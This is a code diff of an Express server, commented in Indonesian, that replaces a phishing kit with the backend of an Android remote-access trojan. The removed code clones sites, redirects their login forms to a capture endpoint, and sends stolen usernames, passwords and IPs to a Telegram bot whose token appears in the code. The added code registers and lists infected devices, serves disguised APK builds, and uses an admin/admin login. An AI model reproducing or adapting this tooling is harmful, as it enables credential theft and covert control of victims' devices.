@@ -1,137 +1,114 @@
 const express = require('express');
-const cors = require('cors');
-const fs = require('fs');
+const http = require('http');
 const path = require('path');
-const axios = require('axios');
-const cheerio = require('cheerio');
-const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+const jwt = require('jsonwebtoken');
 
 const app = express();
-app.use(cors());
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
-app.use(express.static('public'));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// ============================================
-// KONFIGURASI RIOOMD (GANTI DI SINI)
-// ============================================
-const SECRET_TOKEN = "RIOOMD-2026-X9F2"; // Token Web Panel
-const BOT_TOKEN = "8957261476:AAGZB6lYJ7pMXm_v_tOXZPQcIxnglfBqBuI"; // Token dari @BotFather
-const OWNER_ID = 6701550065; // ID Telegram lu dari @userinfobot
-const PANEL_URL = "http://localhost:3000"; // Ganti pakai domain/IP VPS lu
+const PORT = process.env.SERVER_PORT || 4732;
+const JWT_SECRET = "AURORA_LITE_SECRET_KEY_999";
+const CONFIG_PATH = path.join(__dirname, 'config.json');
 
-const DATA_DIR = path.join(__dirname, '.data_rioomd');
-if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+const server = http.createServer(app);
 
-// ============================================
-// TELEGRAM BOT RIOOMD
-// ============================================
-let bot;
-if (BOT_TOKEN !== "PASTE_TOKEN_BOTFATHER_DISINI") {
-  bot = new TelegramBot(BOT_TOKEN, { polling: true });
-  console.log('[RIOOMD TELEGRAM] Bot aktif!');
+// Database Sederhana (In-Memory)
+let activeDevices = [];
+let currentTargetUrl = "https://rioomd.my.id";
 
-  bot.onText(/\/start/, (msg) => {
-    if (msg.from.id !== OWNER_ID) return;
-    bot.sendMessage(msg.chat.id, '🕷️ *RIOOMD PHISING BUILDER*\n\nCommand:\n`/build <url>` - Bikin link phising\n`/creds` - Lihat data masuk', { parse_mode: 'Markdown' });
-  });
-
-  bot.onText(/\/build (.+)/, async (msg, match) => {
-    if (msg.from.id !== OWNER_ID) return;
-    const targetUrl = match[1];
-    const chatId = msg.chat.id;
-
-    bot.sendMessage(chatId, `⏳ *RIOOMD System:* Cloning ${targetUrl}...`, { parse_mode: 'Markdown' });
-
+// ================== KONFIGURASI TARGET URL ==================
+function getTargetUrl() {
+  if (fs.existsSync(CONFIG_PATH)) {
     try {
-      const response = await axios.get(targetUrl, {
-        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-      });
-      let html = response.data;
-      const $ = cheerio.load(html);
-
-      $('form').each((i, el) => {
-        $(el).attr('action', '/api/capture');
-        $(el).attr('method', 'POST');
-      });
-
-      const randomId = Math.random().toString(36).substring(2, 10);
-      const fileName = `${randomId}.html`;
-      fs.writeFileSync(path.join(DATA_DIR, fileName), $.html());
-
-      const stealthLink = `${PANEL_URL}/accounts/${randomId}`;
-      
-      bot.sendMessage(chatId, `✅ *RIOOMD LINK SIAP!*\n\nKirim link ini ke target:\n${stealthLink}`, { parse_mode: 'Markdown' });
-
-    } catch (error) {
-      bot.sendMessage(chatId, `❌ RIOOMD Error: Gagal cloning URL.`);
-    }
-  });
-
-  bot.onText(/\/creds/, (msg) => {
-    if (msg.from.id !== OWNER_ID) return;
-    if (fs.existsSync('captured_rioomd.txt')) {
-      const data = fs.readFileSync('captured_rioomd.txt', 'utf-8');
-      bot.sendMessage(msg.chat.id, `\`\`\`\n${data.substring(0, 4000)}\n\`\`\``, { parse_mode: 'Markdown' });
-    } else {
-      bot.sendMessage(msg.chat.id, 'RIOOMD: Belum ada data masuk.');
-    }
-  });
+      const data = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
+      return data.targetUrl || currentTargetUrl;
+    } catch (e) { return currentTargetUrl; }
+  }
+  return currentTargetUrl;
 }
 
-// ============================================
-// WEB API RIOOMD
-// ============================================
-app.post('/api/build', async (req, res) => {
-  const { targetUrl, token } = req.body;
-  if (token !== SECRET_TOKEN) return res.status(401).json({ error: 'RIOOMD Token salah!' });
+function saveTargetUrl(url) {
+  currentTargetUrl = url;
+  fs.writeFileSync(CONFIG_PATH, JSON.stringify({ targetUrl: url }, null, 2));
+}
 
-  try {
-    const response = await axios.get(targetUrl, {
-      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
-    });
-    let html = response.data;
-    const $ = cheerio.load(html);
-
-    $('form').each((i, el) => {
-      $(el).attr('action', '/api/capture');
-      $(el).attr('method', 'POST');
-    });
-
-    const randomId = Math.random().toString(36).substring(2, 10);
-    fs.writeFileSync(path.join(DATA_DIR, `${randomId}.html`), $.html());
-
-    res.json({ success: true, link: `${PANEL_URL}/accounts/${randomId}` });
-  } catch (error) {
-    res.status(500).json({ error: 'RIOOMD Gagal cloning web target' });
-  }
-});
-
-app.get('/accounts/:id', (req, res) => {
-  const filePath = path.join(DATA_DIR, `${req.params.id}.html`);
-  if (fs.existsSync(filePath)) res.sendFile(filePath);
-  else res.redirect('https://accounts.google.com');
-});
-
-app.post('/api/capture', (req, res) => {
-  const data = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const time = new Date().toISOString();
+// ================== API LOGIN ==================
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) return res.status(400).json({ status: false, message: 'Isi Username/Password' });
   
-  let userVal = data.email || data.username || data.identifier || data.phone || Object.values(data)[0] || '-';
-  let passVal = data.password || data.pass || data.pin || Object.values(data)[1] || '-';
-
-  const logData = `[${time}] IP: ${ip} | User: ${userVal} | Pass: ${passVal}\n`;
-  fs.appendFileSync('captured_rioomd.txt', logData);
-  
-  if (bot && OWNER_ID) {
-    bot.sendMessage(OWNER_ID, `🚨 *RIOOMD TARGET TERTANGKAP!*\n\nIP: ${ip}\nData: \`${userVal} | ${passVal}\``, { parse_mode: 'Markdown' }).catch(()=>{});
+  if (username === 'admin' && password === 'admin') {
+    const token = jwt.sign({ username, role: 'admin' }, JWT_SECRET, { expiresIn: '30d' });
+    return res.json({ status: true, token, role: 'admin' });
   }
-
-  console.log(`\n[RIOOMD HIT] ${userVal} | ${passVal} | IP: ${ip}\n`);
-  res.redirect('https://accounts.google.com');
+  res.status(401).json({ status: false, message: 'Username/Password salah' });
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log(`[RIOOMD SERVER] Jalan di port ${process.env.PORT || 3000}`);
+// ================== API DYNAMIC TARGET URL ==================
+app.post('/api/set-target', (req, res) => {
+  const { url } = req.body;
+  if (!url) return res.status(400).json({ status: false, message: 'URL kosong' });
+  saveTargetUrl(url);
+  console.log(`[CONFIG] Target URL updated to: ${url}`);
+  res.json({ status: true, url });
+});
+
+app.get('/api/get-target', (req, res) => {
+  res.send(getTargetUrl());
+});
+
+// ================== API HTTP RAT (PENGGANTI WEBSOCKET) ==================
+// 1. APK Target nembak ini buat "Lapor Diri"
+app.post('/api/device/register', (req, res) => {
+  const { device_id, name, os, battery } = req.body;
+  if (!device_id) return res.status(400).json({ status: false });
+
+  const existing = activeDevices.find(d => d.id === device_id);
+  if (existing) {
+    existing.last_seen = Date.now();
+    existing.battery = battery;
+  } else {
+    activeDevices.push({
+      id: device_id,
+      name: name || 'Unknown',
+      os: os || 'Android',
+      battery: battery || 100,
+      last_seen: Date.now()
+    });
+    console.log(`[RAT HTTP] Device Connected: ${name}`);
+  }
+  res.json({ status: true });
+});
+
+// 2. Flutter nembak ini buat "Cek Siapa Aja Device yang Online"
+app.get('/api/device/list', (req, res) => {
+  // Bersihin device yang udah gk nembak > 10 detik
+  const now = Date.now();
+  activeDevices = activeDevices.filter(d => now - d.last_seen < 10000); 
+  res.json({ devices: activeDevices });
+});
+
+// ================== API BUILD APK ==================
+app.get('/api/build-apk', (req, res) => {
+  const { name } = req.query;
+  if (!name) return res.status(400).send('Nama APK kosong');
+  const apkPath = path.join(__dirname, 'template.apk');
+
+  if (!fs.existsSync(apkPath)) return res.status(404).send('File template.apk tidak ada');
+  const stats = fs.statSync(apkPath);
+  if (stats.size === 0) return res.status(500).send('File template.apk kosong / 0B');
+
+  console.log(`[SUKSES] Mengirim ${name}.apk`);
+  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+  res.setHeader('Content-Disposition', `attachment; filename="${name}.apk"`);
+  res.setHeader('Content-Length', stats.size);
+  
+  const stream = fs.createReadStream(apkPath);
+  stream.pipe(res);
+});
+
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`🚀 [AURORA LITE - HTTP MODE] Running on port ${PORT}`);
 });
